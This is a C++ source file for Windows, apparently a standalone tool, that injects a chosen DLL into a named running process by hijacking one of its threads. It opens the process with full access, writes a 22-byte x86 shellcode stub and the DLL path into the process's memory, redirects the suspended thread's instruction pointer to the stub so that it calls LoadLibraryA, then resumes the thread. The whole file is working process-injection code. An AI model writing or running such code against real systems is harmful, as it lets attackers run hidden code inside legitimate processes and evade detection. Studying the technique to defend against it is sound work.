#include <iostream>
#include <string>
#include <Windows.h>
#include <TlHelp32.h>

#define SHELLCODE_SIZE 22

#define OLD_IP_OFFSET 1
#define DLL_NAME_OFFSET 8
#define LOAD_LIBRARY_OFFSET 13

#define DELAY_TIME 6000

HANDLE getProcessHandle(const std::string& name, DWORD* threadId);
void HijackThread(HANDLE process, HANDLE thread, FARPROC loadFunc, const std::string& dllName);

int main()
{
	std::cout << "Enter process name: ";
	std::string processName;
	std::getline(std::cin, processName);

	std::cout << "Enter dll name (full path): ";
	std::string dllName;
	std::getline(std::cin, dllName);

	FARPROC loadLibrary = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");

	DWORD threadId;
	HANDLE remoteProcess = getProcessHandle(processName, &threadId);
	HANDLE remoteThread = OpenThread(THREAD_ALL_ACCESS, false, threadId);

	HijackThread(remoteProcess, remoteThread, loadLibrary, dllName);
	
	std::cout << "Thread hijacking has been made" << std::endl;

	CloseHandle(remoteThread);
	CloseHandle(remoteProcess);

	return 0;
}

HANDLE getProcessHandle(const std::string& name, DWORD* threadId)
{
	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);

	if (Process32First(snapshot, &entry))
	{	
		while (Process32Next(snapshot, &entry))
		{
			if (name == entry.szExeFile)
			{
				THREADENTRY32 threadEntry = { sizeof(THREADENTRY32) };
				if (Thread32First(snapshot, &threadEntry))
				{
					do
					{
						if (threadEntry.th32OwnerProcessID == entry.th32ProcessID)
						{
							*threadId = threadEntry.th32ThreadID;
							break;
						}
					} while (Thread32Next(snapshot, &threadEntry));
				}
				
				HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, entry.th32ProcessID);
				CloseHandle(snapshot);
				return hProcess;
			}
		}
	}

	CloseHandle(snapshot);
	return nullptr;
}

void HijackThread(HANDLE process, HANDLE thread, FARPROC loadFunc, const std::string & dllName)
{
	// allocation for shellcode
	BYTE shellcode[] = { 0x68, 0xAA, 0xAA, 0xAA, 0xAA, 0x60, 0x9C, 0x68, 0xBB, 0xBB, 0xBB,
		0xBB, 0xB8, 0xCC, 0xCC, 0xCC, 0xCC, 0xFF, 0xD0, 0x9D, 0x61, 0xC3 };

	// allocating memory for shellcode in process
	LPVOID shellcodeAddr = VirtualAllocEx(process, nullptr, SHELLCODE_SIZE,
		MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	VirtualProtectEx(process, shellcodeAddr, SHELLCODE_SIZE, PAGE_EXECUTE_READWRITE, nullptr);

	// allocating and writing dll name into memory
	LPVOID dllAddr = VirtualAllocEx(process, nullptr, dllName.size() + 1, MEM_COMMIT, PAGE_READWRITE);
	WriteProcessMemory(process, dllAddr, dllName.c_str(), dllName.size() + 1, nullptr);

	SuspendThread(thread);

	// getting thread's context
	CONTEXT threadContext = { 0 };
	threadContext.ContextFlags = CONTEXT_CONTROL;
	GetThreadContext(thread, &threadContext);

	// adding the addresses to the shellcode
	*(DWORD*)(shellcode + OLD_IP_OFFSET) = threadContext.Eip;
	*(DWORD*)(shellcode + DLL_NAME_OFFSET) = (DWORD)dllAddr;
	*(DWORD*)(shellcode + LOAD_LIBRARY_OFFSET) = (DWORD)loadFunc;

	// writing the shellcode into memory and setting eip register to the shellcode
	WriteProcessMemory(process, shellcodeAddr, shellcode, SHELLCODE_SIZE, nullptr);
	threadContext.Eip = (DWORD)shellcodeAddr;
	SetThreadContext(thread, &threadContext);

	ResumeThread(thread);

	Sleep(DELAY_TIME); // giving time to the shellcode to run
	
	// cleaning the memory
	VirtualFreeEx(process, dllAddr, dllName.size() + 1, MEM_DECOMMIT);
	VirtualFreeEx(process, shellcodeAddr, SHELLCODE_SIZE, MEM_DECOMMIT);
}
